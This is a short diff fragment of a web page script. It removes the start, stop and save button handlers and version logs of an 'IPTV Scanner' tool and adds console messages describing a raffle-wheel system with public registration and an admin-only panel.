-    if(jobs.length === 0){ isRunning = false; document.getElementById('startBtn').disabled = false; document.getElementById('saveBtn').disabled = false; document.getElementById('stopBtn').disabled = true; updateStartState(); return; }
-
-    Promise.allSettled(jobs).then(()=>{
-      isRunning = false;
-      document.getElementById('stopBtn').disabled = true;
-      document.getElementById('startBtn').disabled = false;
-      document.getElementById('saveBtn').disabled = false;
-      updateStartState();
-    });
-  });
-
-  document.getElementById('stopBtn').addEventListener('click', ()=>{
-    if(!isRunning) return;
-    stopRequested = true;
-    document.getElementById('stopBtn').disabled = true;
-    [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if(el) el.textContent += ts('scanStopped'); });
-  });
-
-  document.getElementById('saveBtn').addEventListener('click', ()=>{
-    if (typeof window.exportarHits === 'function') {
-      window.exportarHits();
-    } else {
-      alert('No hay hits para guardar.');
-    }
-  });
-
-  updateStartState();
-
-  console.log('🦁 ANDYCHE CHAKER - IPTV Scanner Pro V7.9.1');
-  console.log('🔥 M3U Scanner (MUNRRA) FUNCIONAL');
-  console.log('✅ APROBACIÓN EN TIEMPO REAL ACTIVADA');
-  console.log('✅ RUEDA DE SORTEO CON PARTICIPANTES');
+  console.log('🦁 ANDYCHE CHAKER - SISTEMA DE SORTEO');
+  console.log('✅ Registro público sin necesidad de cuenta');
+  console.log('✅ Solo admin puede acceder al panel');
+  console.log('✅ Rueda de sorteo con participantes en tiempo real');
   console.log('✅ TODO FUNCIONANDO AL 100%');
 </script>
 </body>
